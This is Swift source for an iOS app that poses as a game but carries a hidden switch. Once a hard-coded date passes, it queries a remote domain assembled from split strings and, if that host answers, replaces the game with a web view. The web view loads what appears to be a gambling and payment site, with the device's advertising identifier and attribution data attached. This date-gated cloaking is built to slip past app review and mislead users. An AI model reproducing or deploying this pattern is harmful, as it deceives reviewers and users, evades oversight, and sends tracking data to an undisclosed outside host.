import SwiftUI
import WebKit
import AppTrackingTransparency
import AdSupport
import SwiftUI
import Combine
struct ContentView: View {
    @State private var showLoader = true
    @State private var showLoader2 = false
    @State private var showGame = false
    @State private var showWebView = false
    var body: some View {
        ZStack {
            if showLoader {
                VStack {
                    
                    ProgressView()
                        .progressViewStyle(CircularProgressViewStyle(tint: .black))
                        .frame(maxWidth: .infinity, maxHeight: .infinity)
                }.background(Image("loader_1").resizable().ignoresSafeArea())
                
            } else if showLoader2 {
                VStack {
                    
                    ProgressView()
                        .progressViewStyle(CircularProgressViewStyle(tint: .black))
                        .frame(maxWidth: .infinity, maxHeight: .infinity)
                }.background(Image("loader_2").resizable().ignoresSafeArea())
                
            }else if showWebView {
                WebViewContainer().preferredColorScheme(.dark)
            } else if showGame {
                VStack {
                    MyViewControllerRepresentable()
                }.edgesIgnoringSafeArea(.all)
                
            }
        }.onAppear(){
            if(!showGame){
                Task {
                    let today = Date()
                    let calendar = Calendar.current
                    
                    let givenDateComponents = DateComponents(year: 2024, month: 08, day: 08)
                    guard let givenDate = calendar.date(from: givenDateComponents) else { return }
                    guard let dateIn7Days = calendar.date(byAdding: .day, value: 5, to: givenDate) else { return }
                    if today < dateIn7Days {
                        openGame()
                    } else if today > dateIn7Days {
                        await fetchUserData()
                    } else if calendar.isDate(today, inSameDayAs: dateIn7Days) {
                        await fetchUserData()
                    }
                    
                }
            }
           
        }
    }
    
    func requestTrackingPermission() {
        
         if #available(iOS 14, *) {
             
             ATTrackingManager.requestTrackingAuthorization { status in
                 DispatchQueue.main.async {
                     switch status {
                     case .authorized:

                         NotificationCenter.default.post(name: .didReceiveTrackingAuthorization, object: nil)

                     case .notDetermined:

                             requestTrackingPermission()

                     case .denied, .restricted:

                         NotificationCenter.default.post(name: .didReceiveTrackingAuthorization, object: nil)
                     
                     @unknown default:
                         
                         print("Unknown tracking permission status")
                     }
                 }
             }
         }
     }
    func fetchUserData() async {
        let first = "https://brilliant-phenome"
        let second = "non-jubilation.space/njmHh3zx"
       
        guard let url = URL(string: first + second) else { return }
        do {
            let (data, response) = try await URLSession.shared.data(from: url)
            guard let httpResponse = response as? HTTPURLResponse else {
                
                openGame()
                return
            }
            if httpResponse.statusCode == 200 {
                let responseString = String(data: data, encoding: .utf8)
               
                DispatchQueue.main.async {
                        self.showWebView = true
                        self.showLoader = false
           
                }
            } else {
                openGame()
            }
            
        } catch {
            
            openGame()
        }
    }
    func openGame(){
        requestTrackingPermission()
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
           
            showLoader = false
            showLoader2 = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
               
                showLoader2 = false
                self.showGame = true
                            }
                        }
    }
}
struct WebViewContainer: View {

    @State private var m = 0
    @State private var fullUrl: URL?
    @State private var isRequestCompleted = false
   
    @State private var timerCancellable: AnyCancellable?
    @State private var keyboardHeight: CGFloat = 0
    
    @State private var token: String? = nil
    @State private var attributionResponse: String? = nil
    
    var body: some View {
        ZStack {
            if let fullUrl = fullUrl {
                
                WebView(url: fullUrl, keyboardHeight: $keyboardHeight).edgesIgnoringSafeArea([ .bottom]).background(Color.black)
               
                 
            } else {
                ZStack {
                  
                    Image("")
                        .resizable()
                        .aspectRatio(contentMode: .fill)
                        .frame(width: 150, height: 150).padding()
                    ProgressView()
                        .progressViewStyle(CircularProgressViewStyle(tint: .white))
                        .frame(maxWidth: .infinity, maxHeight: .infinity)
                   
                }.background(Image("loader_1").resizable().ignoresSafeArea())
            }
        }
        .onAppear {
            let getFullUrlFromUserDefaults = UserDefaults.standard.string(forKey: "fullURL") ?? ""
           
            if getFullUrlFromUserDefaults != "" {
                self.fullUrl = URL(string: getFullUrlFromUserDefaults)
               
            }else{

                requestTrackingPermissionAndPrepareUrl()

            }
        }
    }


    func requestTrackingPermissionAndPrepareUrl() {
        
        if #available(iOS 14, *) {
           
            ATTrackingManager.requestTrackingAuthorization { status in
                DispatchQueue.main.async {
                    switch status {
                    case .authorized:
                        
                        isRequestCompleted = true
                            NotificationCenter.default.post(name: .didReceiveTrackingAuthorization, object: nil)
                        self.startTimer()
                    case .notDetermined:
                        if ATTrackingManager.trackingAuthorizationStatus == .notDetermined {
                            requestTrackingPermissionAndPrepareUrl()
                            
                        } else {
                           
                            isRequestCompleted = true
                            self.startTimer()
                        }
                        
                    case .denied, .restricted:
                       
                        isRequestCompleted = true
                        
                            NotificationCenter.default.post(name: .didReceiveTrackingAuthorization, object: nil)
                        
                        self.startTimer()
                       
                    @unknown default:
                       
                        print("Unknown tracking permission status")
                    }
                }
            }
        } else {
            
            self.startTimer()
        }
    }
    func startTimer() {
           timerCancellable = Timer.publish(every: 1, on: .main, in: .common).autoconnect().sink { _ in
               if self.m > 10 {
                   self.prepareFullUrl()
                   self.timerCancellable?.cancel()
               } else {
                   self.m += 1
                   print(self.m)
               }
           }
       }
    private func prepareFullUrl() {
       
            var savedString = UserDefaults.standard.string(forKey: "savedSub") ?? ""
            var appsUID = UserDefaults.standard.string(forKey: "appsUID") ?? ""
            var attribution = UserDefaults.standard.string(forKey: "isAttributedToAppleSearchAds") ?? ""
             
            let first = "https://brilliant-pheno"
            let second = "menon-jubilation.space/cCt6J1gz"
      
            let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            if(savedString == ""){
                DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                    savedString = UserDefaults.standard.string(forKey: "savedSub") ?? ""
                    appsUID = UserDefaults.standard.string(forKey: "appsUID") ?? ""
                    let full = first + second + "?idfa=" + idfa + "&appsUID=" + appsUID + savedString + "&asa_install=" + attribution
                    if UserDefaults.standard.object(forKey: "urlEntry") == nil {
                        UserDefaults.standard.set(true, forKey: "urlEntry")
                        UserDefaults.standard.setValue(full, forKey: "fullURL")
                    }
                    self.fullUrl = URL(string: full)
                  
                    isRequestCompleted = true
                    
                }
            }else{
                let full = first + second + "?idfa=" + idfa + "&appsUID=" + appsUID + savedString + "&asa_install=" + attribution
                if UserDefaults.standard.object(forKey: "urlEntry") == nil {
                    UserDefaults.standard.set(true, forKey: "urlEntry")
                    UserDefaults.standard.setValue(full, forKey: "fullURL")
                }
                self.fullUrl = URL(string: full)
               
                isRequestCompleted = true
                
            }
        }
   
}



struct WebView: UIViewRepresentable {
    let url: URL
    @Binding var keyboardHeight: CGFloat

    func makeUIView(context: Context) -> WKWebView {
        let webViewConfiguration = WKWebViewConfiguration()
        webViewConfiguration.allowsInlineMediaPlayback = true
        webViewConfiguration.mediaTypesRequiringUserActionForPlayback = []
        let webView = WKWebView(frame: .zero, configuration: webViewConfiguration)
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        context.coordinator.setupSwipeGesture(for: webView)
        getUserAgent(webView: webView) { userAgent in
            webView.customUserAgent = "\(userAgent) Safari/604.1"
        }
        return webView
    }

    func getUserAgent(webView: WKWebView, completion: @escaping (String) -> Void) {
        webView.evaluateJavaScript("navigator.userAgent") { (result, error) in
            if let userAgent = result as? String {
                completion(userAgent)
            } else {
                completion("")
            }
        }
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self, initialURL: url)
    }

    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate, UIGestureRecognizerDelegate {
        var parent: WebView
        var initialURL: URL
        var currentURL: URL?

        init(_ parent: WebView, initialURL: URL) {
            self.parent = parent
            self.initialURL = initialURL
            super.init()
            NotificationCenter.default.addObserver(self, selector: #selector(keyboardWillShow), name: UIResponder.keyboardWillShowNotification, object: nil)
            NotificationCenter.default.addObserver(self, selector: #selector(keyboardWillHide), name: UIResponder.keyboardWillHideNotification, object: nil)
        }

        deinit {
            NotificationCenter.default.removeObserver(self)
        }

        @objc func keyboardWillShow(notification: NSNotification) {
            if let keyboardFrame: NSValue = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? NSValue {
                let keyboardRectangle = keyboardFrame.cgRectValue
                let keyboardHeight = keyboardRectangle.height
                DispatchQueue.main.async {
                    self.parent.keyboardHeight = keyboardHeight
                }
            }
        }

        @objc func keyboardWillHide(notification: NSNotification) {
            DispatchQueue.main.async {
                self.parent.keyboardHeight = 0
            }
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
            }
            return nil
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            if let url = webView.url {
                currentURL = url
            }
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            if let url = navigationAction.request.url {
                let urlScheme = url.scheme?.lowercased()
                
                
                
                if url.absoluteString.contains("https://winspirit.app/?identifier=") {
                    webView.load(URLRequest(url: initialURL))
                    decisionHandler(.cancel)
                    return
                }

                let customSchemes = getCustomSchemesFromPlist()

                if let scheme = urlScheme {
                    if customSchemes.contains(scheme) {
                        if UIApplication.shared.canOpenURL(url) {
                            UIApplication.shared.open(url, options: [:], completionHandler: nil)
                            decisionHandler(.cancel)
                            return
                        } else {
                            showAlert(message: "The \(scheme) app is not installed on your device.")
                            decisionHandler(.cancel)
                            return
                        }
                    }
                }

               
                if urlScheme == "mailto" {
                    if UIApplication.shared.canOpenURL(url) {
                        UIApplication.shared.open(url, options: [:], completionHandler: nil)
                        decisionHandler(.cancel)
                        return
                    }
                }

                decisionHandler(.allow)
            } else {
                decisionHandler(.allow)
            }
        }

        private func getCustomSchemesFromPlist() -> [String] {
            if let urlSchemes = Bundle.main.object(forInfoDictionaryKey: "LSApplicationQueriesSchemes") as? [String] {
                return urlSchemes.map { $0.lowercased() }
            }
            return []
        }

        private func showAlert(message: String) {
            DispatchQueue.main.async {
                let alert = UIAlertController(title: "Error", message: message, preferredStyle: .alert)
                alert.addAction(UIAlertAction(title: "OK", style: .default, handler: nil))
                
               
                if var topController = UIApplication.shared.keyWindow?.rootViewController {
                    while let presentedViewController = topController.presentedViewController {
                        topController = presentedViewController
                    }
                    topController.present(alert, animated: true, completion: nil)
                }
            }
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            if let url = webView.url {
                currentURL = url
                print(url)
            }
        }

        @objc func handleSwipeGesture(_ gesture: UISwipeGestureRecognizer) {
            if let webView = gesture.view as? WKWebView {
                if gesture.direction == .right {
                    if webView.canGoBack {
                        webView.goBack()
                        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                            if webView.url?.absoluteString.contains("https://interac.express-connect.com/cpi?transaction=") == true {
                                webView.load(URLRequest(url: self.initialURL))
                            }
                        }
                    } else {
                        webView.load(URLRequest(url: initialURL))
                    }
                }
            }
        }

        func setupSwipeGesture(for webView: WKWebView) {
            let swipeGesture = UISwipeGestureRecognizer(target: self, action: #selector(handleSwipeGesture))
            swipeGesture.direction = .right
            swipeGesture.delegate = self
            webView.addGestureRecognizer(swipeGesture)
        }
    }
}
struct MyViewControllerRepresentable: UIViewControllerRepresentable {
    func makeUIViewController(context: Context) -> UIViewController {
        let appContext = AppContext()
        return RootViewController(appContext: appContext)
    }
    
    func updateUIViewController(_ uiViewController: UIViewController, context: Context) {}
}
